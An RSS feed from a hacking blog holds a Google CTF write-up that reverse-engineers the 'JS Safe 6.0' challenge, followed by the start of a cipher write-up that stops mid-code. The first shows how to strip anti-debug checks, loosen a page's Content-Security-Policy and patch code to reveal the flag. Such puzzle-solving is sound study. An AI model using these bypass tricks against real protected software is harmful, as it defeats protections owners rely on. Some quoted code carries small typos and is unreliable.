<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>c0derpwner BlogSpot</title>
    <description>A Blog For Hackers</description>
    <link>http://localhost:4000</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <author>
      <name>c0derpwnergit remote add origin</name>
      <email>someone@somewebsite.somedomain</email>
      <uri>https://ashishchaudhary.in/hacker-blog</uri>
    </author>
    
      <item>
        <title>Web - JS Safe 6.0 - GoogleCTF</title>
        <description>&lt;p&gt;Challenge description: You stumbled upon someone’s “JS Safe” on the web. It’s a simple HTML file that can store secrets in the browser’s localStorage. This means that you won’t be able to extract any secret from it (the secrets are on the computer of the owner), but it looks like it was hand-crafted to work only with the password of the owner. Another year, another JS Safe challenge! I’m always looking forward to this challenge during Google CTF.&lt;/p&gt;

&lt;p&gt;Opening the HTML file, we see this suspect code:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/js_safe1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But it appears to be just the background cube.&lt;/p&gt;

&lt;p&gt;The “usage instructions” to unlock the safe are:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Open the page in Chrome (the only supported browser)
Open Dev Tools and type:
anti(debug); // Industry-leading antidebug!
unlock(&quot;password&quot;); // -&amp;gt; alert(secret)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A “render loop” is created using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setInterval(renderFrame, frameInterval)&lt;/code&gt; which spams the DevTools console (with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clear()&lt;/code&gt; and the “usage instructions”).&lt;/p&gt;

&lt;p&gt;Scrolling further down the file, now comes the juicy parts, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anti(debug)&lt;/code&gt; function:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/js_safe2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A bunch of “looks like space but is another character”-symbols are in use. From previous years’ JS Safe challenges we know that replacing these bytes with proper spaces will most likely break the code.&lt;/p&gt;

&lt;p&gt;Finally the unlock function looks fairly simple:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/js_safe3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From my understanding it is going to instrument the prototype of lots of common things (arrays, console, etc) such that when calling .get (i.e. property access), the step-value will be incremented. This means we can’t just sprinkle console.log calls everywhere, as that would increase the step value and break the decryption logic.
Further anti-debugging in instrument&lt;/p&gt;

&lt;p&gt;When initially calling anti(…) we pass the variable debug [1], which ends up inside instrument() that checks two conditions:
document.documentElement.outerHTML.length !== 14347
This is fairly easy to bypass, whenever I change the source file I need to update the “total document length”.&lt;/p&gt;

&lt;p&gt;But the next check is even weirder:&lt;/p&gt;

&lt;p&gt;debug(f, “window.c &amp;amp;&amp;amp; function perf(){ const l = &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot; + f + &quot;&lt;/code&gt;.length; window.step += l; }() // poor man’s ‘performance counter`”);
Normally f.length would be the string length of the function f, but why the backticks (template literals)? What does f expand to?
But what looks even more suspicious is the comment which quotes using a single-quote and end the quote with a backtick (spider senses tingling!)
Modifying the code&lt;/p&gt;

&lt;p&gt;Let’s start by commenting the console.clear(); and console.log(content); to improve the debugging experience. This adds 4 extra characters, so we also need to update the outerHTML.length check:&lt;/p&gt;

&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;220,221c220,221
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;&amp;lt;     console.clear();
&amp;lt;     console.log(content);
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;---
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;&amp;gt;     //console.clear();
&amp;gt;     //console.log(content);
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;285c285
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;&amp;lt;     debug(f, &quot;document.documentElement.outerHTML.length !== 14347&quot;);
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;---
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;&amp;gt;     debug(f, &quot;document.documentElement.outerHTML.length !== 14351&quot;);
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;But keeping track of outerHTML is a bit tedious, so another minimal modification is to change the outerHTML statement from !== realSize to === falseSize, i.e. the logic is the same, but we don’t need to update the value when modifying the rest of the file:&lt;/p&gt;

&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;285c285
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;&amp;lt;     debug(f, &quot;document.documentElement.outerHTML.length !== 14347&quot;);
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;---
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;&amp;gt;     debug(f, &quot;document.documentElement.outerHTML.length === 99999&quot;);
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note: why not just change it to “false” ? We believe the check-function will verify check.toString().length, but we are a bit unsure how - so lets not modify the length of the check-function but doesn’t work….&lt;/p&gt;

&lt;p&gt;I get this warning when opening the modified challenge file in my browser:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Refused to execute inline script because it violates the following Content Security Policy directive: 
&lt;span class=&quot;s2&quot;&gt;&quot;script-src &apos;sha256-P8konjutLDFcT0reFzasbgQ2OTEocAZB3vWTUbDiSjM=&apos; &apos;sha256-eDP6HO9Yybh41tLimBrIRGHRqYoykeCv2OYpciXmqcY=&apos; &apos;unsafe-eval&apos;&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Either the &lt;span class=&quot;s1&quot;&gt;&apos;unsafe-inline&apos;&lt;/span&gt; keyword, a &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;sha256-C7RyoweJ1Looccbu94IGsrn5T/cazOvY7o8EuZZPQJA=&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 
or a nonce &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;nonce-...&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is required to &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;inline execution.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the top of the HTML file, we see this inlined CSP:&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content-Security-Policy&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;c&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;script-src &apos;sha256-P8konjutLDFcT0reFzasbgQ2OTEocAZB3vWTUbDiSjM=&apos; &apos;sha256-eDP6HO9Yybh41tLimBrIRGHRqYoykeCv2OYpciXmqcY=&apos; &apos;unsafe-eval&apos;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We could just remove the CSP completely, but we want to keep the changes minimal. Again the spider senses are tingling, why does the CSP have id=”c”? Why would a CSP-meta element ever need an ID?
Remember the instrument contained this code window.c &amp;amp;&amp;amp; function perf(){ … }, but also at the very top of the anti(debug)-function we see:&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
window.step = 0;
window.cﾠ= true; // Countﾠstepsﾠwith debug (prototype instrumentation is separate)
window.success = false;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So clearly window.c is true regardless of the CSP HTML element, right? Spoiler: No, as I later learned, the whitespace after window.c (i.e. window.c[HERE]=true;) is not actually a whitespace, but a valid javascript identifier, meaning window.c != window.cﾠ!&lt;/p&gt;

&lt;p&gt;Our new modification to the file is now:&lt;/p&gt;

&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;7c7
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;&amp;lt; &amp;lt;meta http-equiv=&quot;Content-Security-Policy&quot; id=&quot;c&quot; content=&quot;script-src &apos;sha256-P8konjutLDFcT0reFzasbgQ2OTEocAZB3vWTUbDiSjM=&apos; &apos;sha256-eDP6HO9Yybh41tLimBrIRGHRqYoykeCv2OYpciXmqcY=&apos; &apos;unsafe-eval&apos;&quot;&amp;gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;---
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;&amp;gt; &amp;lt;meta http-equiv=&quot;Content-Security-Policy&quot; id=&quot;c&quot; content=&quot;script-src &apos;unsafe-inline&apos; &apos;unsafe-eval&apos;&quot;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;setting-breakpoints&quot;&gt;Setting breakpoints&lt;/h2&gt;

&lt;p&gt;A quick’n’dirty way of solving the challenge would be setting a breakpoint on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag[0] == pool[...]&lt;/code&gt; and bruteforce one flag character at a time. But setting a breakpoint in DevTools doesn’t trigger?!  Lets go up one level and set a breakpoint on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anti(debug)&lt;/code&gt;, this should work as nothing weird has been run before that call. Stepping though &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anti(debug)&lt;/code&gt;, we see another sneaky trick, in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;renderFrame()&lt;/code&gt; the call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;multiline(...)&lt;/code&gt; (logic for the big spinning cube) has redefines the global &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r&lt;/code&gt; function to become &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROT-47&lt;/code&gt;, so now the cube block decrypts as:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/js_safe4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This checks &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c.outerHTML.length*2 == 386 &amp;amp;&amp;amp; (new Error).stack.split(&apos;eval&apos;).length&amp;gt;4&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;So if we change the length of the CSP or the stack trace is not correct, then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;window.step&lt;/code&gt; will be set to a wrong value and the decryption will not work! We fix this by padding the CSP with spaces.&lt;/p&gt;

&lt;h4 id=&quot;escaping-the-debugger&quot;&gt;Escaping the debugger&lt;/h4&gt;

&lt;p&gt;We know &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;instrument&lt;/code&gt;is called with the prototypes of many common values, so I uncommented that (inside anti(debug)) 
and added: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[].flat().concat(check, eval).forEach(instrument);&lt;/code&gt;.
We can’t step into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;debug(f, &quot;...&quot;)&lt;/code&gt; function, but we can replace it with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;console.log(...)&lt;/code&gt; to figure out what that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;f&lt;/code&gt; expands to:
&lt;img src=&quot;/assets/js_safe5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This gives us the following code being run in the “debug context”:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/js_safe6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we finally see the check()-code properly expanded (and the while(true) debugger active).
We also see the rest of the build-in functions will not “escape”, as they will expand into the string “[native code]”, e.g. for eval this gives:&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;perf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`function eval() { [native code] }`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;step&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// poor man&apos;s &apos;performance counter`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;bxefxbexa0-as-a-valid-identifier&quot;&gt;b’\xef\xbe\xa0’ as a valid identifier&lt;/h2&gt;

&lt;p&gt;Another cool trick; remember how the global function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r&lt;/code&gt; was overriden in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check()&lt;/code&gt;, i.e:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ROT13 TODO:ﾠuse thisfor anﾠadditional encryption layerﾠ&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;returnt&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;a-z&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/gi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;charCodeAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;fromCharCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;78&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;But actually that “space” (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\xef\xbe\xa0&lt;/code&gt;) in front of the equals symbol (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[HERE]= function { ... }&lt;/code&gt;) is a valid javascript identifier!&lt;/p&gt;

&lt;p&gt;This means that the following code:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ﾠ&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`?o&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Wn0o0U0N?05o0ps}q0|mt&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ne&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;us&amp;amp;400_pn0ss_mph_0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;pool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Is actually two(!) function calls, first &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tmp = \xef\xbe\xa0(&quot;?o&amp;gt;...5&quot;)&lt;/code&gt; then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pool = r(tmp)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Furthermore the &lt;em&gt;looks like space but isn’t&lt;/em&gt; symbol is also used in the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;double&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`window.stepﾠ*= 2`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So the above code will not change &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;window.step&lt;/code&gt; when called (but instead change &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;window.stepﾠ&quot;&lt;/code&gt; variable).&lt;/p&gt;

&lt;h3 id=&quot;modifying-check-and-printing-flag-chars&quot;&gt;Modifying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check()&lt;/code&gt; and printing flag chars&lt;/h3&gt;

&lt;p&gt;Now we’re comfortable modifying the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check()&lt;/code&gt; code and patching out &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check.toString().length !== 914&lt;/code&gt; anti-debug trick.&lt;/p&gt;

&lt;p&gt;We can modify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;while (!window.success) { ... }&lt;/code&gt; loop such that instead of comparing each flag char, we print the expected value and continue.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/js_safe_final.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

</description>
        <pubDate>Mon, 04 Aug 2025 00:00:00 +0200</pubDate>
        <link>http://localhost:4000//GoogleCTF-Web-JS-Safe-6.0</link>
        <link href="http://localhost:4000/GoogleCTF-Web-JS-Safe-6.0"/>
        <guid isPermaLink="true">http://localhost:4000/GoogleCTF-Web-JS-Safe-6.0</guid>
      </item>
    
      <item>
        <title>Crypto - Numerology - GoogleCTF</title>
        <description>&lt;h2 id=&quot;crypto&quot;&gt;Crypto&lt;/h2&gt;

&lt;p&gt;The only one i did was &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Numerology&lt;/code&gt; an easy cryptography challenge where it was presented a custom stream cipher inspired by ChaCha20, but with a twist: it uses only a single round of mixing operations.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crypto_numerology.py&lt;/code&gt;: The cipher implementation&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctf_challenge_package.json&lt;/code&gt;: JSON dataset of known plaintext/ciphertext pairs, together with the key and encrypted flag&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;init.sh&lt;/code&gt;: Challenge generation script&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt;: Sample flag&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readme.md&lt;/code&gt;: Brief description&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The cipher in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crypto_numerology.py&lt;/code&gt; is based on &lt;a href=&quot;https://cr.yp.to/chacha.html&quot;&gt;ChaCha20&lt;/a&gt;, but heavily modified:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;It allows &lt;strong&gt;1 to 8 single-round operations&lt;/strong&gt; (not 20 double-rounds like real ChaCha20).&lt;/li&gt;
  &lt;li&gt;Each round applies one quarter-round function from a static list of 8.&lt;/li&gt;
  &lt;li&gt;It uses a fixed set of constants (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CHACHA_CONSTANTS&lt;/code&gt;) in state setup.&lt;/li&gt;
  &lt;li&gt;Like ChaCha20, the output keystream is generated from a 512-bit (64-byte) block.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;make_block&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;make_block(...)&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;The keystream is generated via this function:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;make_block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nonce_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;constants&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Steps to generate one &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keystream_block&lt;/code&gt;:&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Initialize state&lt;/strong&gt; as a 16-word array:
    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;constants&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;4.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;split&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;into&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;words&lt;/span&gt;
